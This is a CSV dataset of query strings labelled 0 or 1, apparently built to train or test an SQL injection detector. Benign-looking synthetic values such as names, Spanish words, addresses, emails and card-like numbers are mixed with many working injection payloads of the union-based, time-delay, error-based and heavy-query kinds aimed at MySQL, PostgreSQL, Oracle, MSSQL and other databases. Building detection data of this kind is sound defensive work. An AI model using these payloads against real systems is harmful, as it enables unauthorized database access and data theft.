Query,Label
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
stahel,0
biurrun-olcoz,0
mu-cheng,0
gilan@escarba.fk,0
santo,0
1' in boolean mode);begin dbms_lock.sleep(5); end#,1
"1""))) rlike (select (case when (6915=4531) then 1 else 0x28 end)) and (((""jzzu""=""jzzu",1
zelda_hjelm5@silver-knights.it,0
alhendn,0
enchufe,0
urrupan moger,0
coulter,0
"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",1
5619033221013076,0
96244363n,0
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gmvk' like 'gmvk",1
abajo,0
desmedro,0
14188360m,0
"-1748%""))) union all select 2987#",1
estornin3,0
hemilce,0
"1' union all select null,null,null,null,null,null,null,null,null#",1
acaudalador,0
"1) as ezje where 5234=5234 and make_set(8403=8403,8899)--",1
"1"") where 3393=3393 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
40146763x,0
cubilla,0
1') and 7290=8416 and ('ktlz' like 'ktlz,1
23251820q,0
vislumbrar,0
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",1
"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
hewson@elrincondelmarmol.ar,0
cazallas caminal,0
"1"")));(select * from (select(sleep(5)))srmq) and (((""eakt"" like ""eakt",1
yazmn,0
6188,0
0e06u8s17,0
85533864s,0
dolores,0
"-7016%"")) union all select 8847,8847,8847--",1
ward@fortelingenieria.si,0
83016924b,0
"c/ era val d'aran s/n, 7?e",0
"1%""))) or 6793=(select 6793 from pg_sleep(5)) and (((""%""=""",1
a98a60az90,0
4108422495216222,0
8853092721111466,0
rabassa,0
pato,0
valenti grans,0
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""ardk"" like ""ardk",1
"1%"")));select (case when (4996=1734) then 1 else 4996*(select 4996 from master..sysdatabases) end)--",1
"1) as nioj where 9703=9703;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
81470918l,0
rtova,0
22991,0
1) as bpap where 7758=7758 or 4240=(select 4240 from pg_sleep(5))--,1
1 where 4245=4245;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
36357,0
03t86i3,0
90899794e,0
"-2230%"" union all select 3303,3303,3303--",1
1;waitfor delay '0:0:5'--,1
1%' or sleep(5)#,1
3226,0
"parque san adrian, 196, 5h",0
arenas burrull,0
arrebatarse,0
49699,0
2331,0
"calle tren 8, 8?h",0
alpuche simani,0
"1""))) and elt(2421=9612,9612) and (((""gbdx"" like ""gbdx",1
souther,0
ji-chuu,0
20,0
4468,0
"c/ mirra 25,",0
hasty,0
-5854))) union all select 5645#,1
58843682e,0
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""nubc"" like ""nubc",1
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('lqql'='lqql",1
"glorieta emperador carlos v, 88 2-h",0
1)));waitfor delay '0:0:5' and (((8981=8981,1
"1"") or sleep(5) and (""xgtk""=""xgtk",1
meed@peliculasen3d.va,0
iolav,0
anand,0
"1"") where 2837=2837 and (3020=3020)*6703--",1
t2591151,0
boisvert,0
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""bnyh""=""bnyh",1
8961981301450385,0
saturin-fabre0@cienciapolicial.int,0
6894,0
1%' and 8594=(select 8594 from pg_sleep(5))--,1
ambas,0
69409914p,0
"-6357"") order by 1--",1
roadman@wdsl.gu,0
bohlen_newtell@lodgemadrid.it,0
aljuba,0
sempronia,0
cardeosa,0
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1
bertie,0
86343464s,0
"1) as pyjx where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",1
94731203e,0
"1"") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
72,0
arbcies,0
96795973j,0
postema,0
"-2414%"") or elt(1032=1032,3623) and (""%""=""",1
2756434329152004,0
7u4o84z1m07459,0
9135,0
06208,0
7297834291786721,0
rabadi,0
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
sabathiel,0
descrieres@enibiza.com.ac,0
"1)) as rbae where 2049=2049 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
leftwich@sms24h.sb,0
6590880314984896,0
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#",1
"1"" where 2886=2886;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
57401003h,0
"1"") as ffon where 2738=2738 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",1
"1"")) or 4240=(select 4240 from pg_sleep(5))--",1
"1"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
toledo,0
valdano,0
"1') where 3330=3330 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1'+(select 'zkum' where 5161=5161 union all select null,null,null,null#",1
kuneva_germaine@ajuntamentdebcn2-0.cy,0
duesaiges,0
"1%' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
galbarros,0
nordes!tal,0
jsica,0
"1%')) union all select null,null,null,null,null,null,null,null,null--",1
33729,0
1'||(select 'aioq' from dual where 8176=8176;begin user_lock.sleep(5); end--,1
5855,0
chojuacka@google-movil.eg,0
-3535%'))) or 5605=4660 and ((('%'=',1
folch pintado,0
"calle silvestre peromarta 60,",0
heda,0
"1) where 9371=9371 union all select null,null,null,null,null,null,null--",1
"1"") as dfmm where 7563=7563 or 8421=(select count(*) from generate_series(1,5000000))--",1
sharnoff,0
"-1065)) union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1
"-5300' union all select 2750,2750,2750,2750,2750,2750--",1
"plaa carles ibaez 48, 6?g",0
fancelli joral,0
"alonso de mendoza, 31 3b",0
"1 where 2823=2823 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
8855,0
"guardia, la",0
"1%"" and 2805=1345",1
mattos@velazquezlarraaga.dd,0
encad7622i6,0
"1"" rlike sleep(5) and ""veub""=""veub",1
cenicero,0
5on39taci19,0
9947210285103354,0
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""ikhr""=""ikhr",1
vai gala,0
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('yqmv'='yqmv",1
"-3501'))) or make_set(7122=6158,6158) and ((('mlfl' like 'mlfl",1
1272,0
persidsky@filtraciondehumos.md,0
-2820')) or 6679=8848--,1
4ere3id13,0
"1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='",1
4140359172053437,0
"1%"" and elt(3114=3114,sleep(5))#",1
33418,0
01206,0
"-7831"")) as krzi where 3798=3798 order by 1--",1
31087137s,0
steinfeld@multireform.sg,0
"lugar higuera canaria, 169",0
50133,0
cholewin,0
burns40,0
1));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
1')) rlike sleep(5) and (('iwct'='iwct,1
1) where 5774=5774;select case when 9848=2618 then 1 else null end--,1
1894,0
1') as uwmy where 6980=6980;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
alano,0
"1'+(select 'ncny' where 5634=5634;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",1
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",1
"1"")) and 9800=8713",1
"1 union all select null,null--",1
"1 or elt(6272=6272,sleep(5))",1
tierra 17,0
manzaneque@ssextremadura.mt,0
"1)) as hgtl where 3864=3864 and elt(3114=3114,sleep(5))#",1
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'psdl' like 'psdl,1
edelweis,0
ernesto,0
pollack,0
puges crcamo,0
mascaro-cimino@3horas.dk,0
0285055545146355,0
rascadura,0
"1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('cgou' like 'cgou",1
s46085i9_s9,0
7656,0
"c/ quintana 132, 13?h",0
corcoy augu,0
corico,0
saysanasy@grupodescansoyhogar.gl,0
02129,0
dionisio@bijoubijoudiferente.tv,0
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
noelyn,0
9usta4ui6,0
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('tzrd'='tzrd",1
"1%"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""%""=""",1
4la3ue95,0
28515,0
vada,0
xifr,0
1') where 5279=5279 or sleep(5)#,1
17240,0
"1%' and 3824=benchmark(5000000,md5(0x76555642)) and '%'='",1
baqu,0
1' where 9242=9242;begin dbms_lock.sleep(5); end--,1
mindy,0
"plza. pedagogo pestalozzi, 157, 6?d",0
bertilia,0
streit bellavista,0
"-1891' in boolean mode) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1
fianna,0
"-5528') union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1
zohreh,0
24806506v,0
"c/ montaer ruiz, 24, 12a",0
loyola,0
32806661j,0
contrapalanqun,0
cantabria,0
"1))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((1205=1205",1
(8266=8266)*9900,1
6837813065545901,0
rohit,0
hornos,0
1'+(select 'tbfj' where 4016=4016;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
valencina de la concepcin,0
livermore-kozlowski@hiteurope.ws,0
salvi figuls,0
lahuen,0
"1') where 6746=6746 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
"1) where 2232=2232;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
forsyne@velaconsultores.mx,0
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('blnh' like 'blnh",1
2289,0
"-9145') as xyya where 8950=8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""ycuo"" like ""ycuo",1
"1%"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",1
77974019v,0
"1'||(select 'eayf' where 5431=5431 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",1
1;(select * from (select(sleep(5)))srmq),1
mora de rubielos,0
9366,0
magnin_arne@tiebreak.com.sr,0
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""yobb"" like ""yobb",1
6239536280691962,0
narrillos del lamo,0
reginald,0
shazmin,0
"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",1
1))) and 8594=(select 8594 from pg_sleep(5))--,1
ojs,0
"-8841%"") or 4361=1910",1
hiscoe,0
"1' in boolean mode) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",1
akatuka cunil,0
"1)) as bebl where 2597=2597 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
calle parque del huecar 75 6?a,0
raysa,0
9087,0
ocaa,0
reaves-phillips@baybay.tm,0
abrams.peabody@hojadecalculo.com.py,0
"1"")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
"1"" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ""tbbk"" like ""tbbk",1
05215,0
pataki-grifties@hiteurope.by,0
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- ivku",1
czarevitz,0
"pasaje trigueros, 170,",0
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('ndhn' like 'ndhn",1
"plaa creu gran, 65",0
"-8007' where 9649=9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1
pingshen,0
slaibe hipolit,0
05240,0
1'||(select 'zeet' from dual where 9567=9567 and 8594=(select 8594 from pg_sleep(5))--,1
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('wzrj'='wzrj",1
44340,0
"1) as hhly where 2906=2906;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"-9337) union all select 5648,5648,5648,5648,5648#",1
34105397p,0
tilbrook@saludyfitness.pr,0
baco,0
peek@clubforex.ax,0
46773841y,0
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",1
munio@so-tel.bn,0
70471887w,0
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",1
"calle barrio carmelo 21,",0
0644186942198058,0
0250216835204033,0
1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||',1
revacunacin,0
"-7485%'))) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1
rdenas,0
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('viad' like 'viad",1
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""isbh"" like ""isbh",1
16154,0
"1""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"camino hoya mondongo, 124",0
rowen,0
"1"") as ybkp where 7788=7788 or 8466=benchmark(5000000,md5(0x694a4745))--",1
1221,0
1')) as hxxm where 3792=3792 and sleep(5)#,1
1008,0
-2648') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('sawt'='sawt,1
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",1
"1'+(select 'ayod' where 7839=7839 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",1
persaud,0
urueas,0
sant andreu salou,0
olaf,0
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""sfnj"" like ""sfnj",1
9490117587717675,0
"1))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((4744=4744",1
3582197540300309,0
e6tal1g68,0
5259660554384998,0
7987,0
linden,0
guerrino,0
"plza. nuevo mundo, 119, 4-d",0
kristel,0
esser-wrixon5@atorre.se,0
2a6in6rosa,0
agnac5n,0
tali,0
34791026f,0
arimany aguila,0
philips@davidymamen.sa,0
l-9rn,0
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('raus'='raus",1
"1%"";select benchmark(5000000,md5(0x4c4d6142)) and ""%""=""",1
4847935769774930,0
b+rigola,0
"calle doctor bove, 65",0
6204145249044457,0
sevilleja de la jara,0
9253,0
"-8327 where 7555=7555 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
64446970g,0
bernaden,0
cangrenarse,0
31358386w,0
kishida@fruteriacartaya.gm,0
"1') as tvqn where 2967=2967;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
380lea,0
"1' where 5004=5004 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
anatoli,0
"1))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((1164=1164",1
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((5432=5432",1
"1%"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
consumativo,0
7823647161649083,0
peiser,0
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
03158,0
orquestra,0
"-8923'+(select xgvz where 9858=9858 union all select 9858,9858,9858#",1
1') where 1645=1645 rlike sleep(5)--,1
1' and 7533=7533 and 'clqy' like 'clqy,1
5521,0
marti,0
"1""))) rlike sleep(5)#",1
50400,0
cerralbo,0
"1))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1)) as zmsa where 6909=6909 union all select null,null,null,null,null,null,null#",1
atos,0
"calle marsella s/n,",0
zaleska_legon@zampy.so,0
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'jiyx'='jiyx",1
subirs figaredo,0
"1' union all select null,null,null,null,null,null,null,null--",1
31252,0
"pasaje magistrado salvador barbera 136,",0
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""qqfd"" like ""qqfd",1
"1%"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
993,0
giribet armisn,0
5176,0
62381470l,0
aboussou,0
"1"");select (case when (6839=2730) then 6839 else 6839*(select 6839 from mysql.db) end)#",1
"1') as jxqt where 4322=4322 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
48064800k,0
"1;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1%'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
fant@tiposdedrogas.gg,0
lorca,0
"pla del peneds, el",0
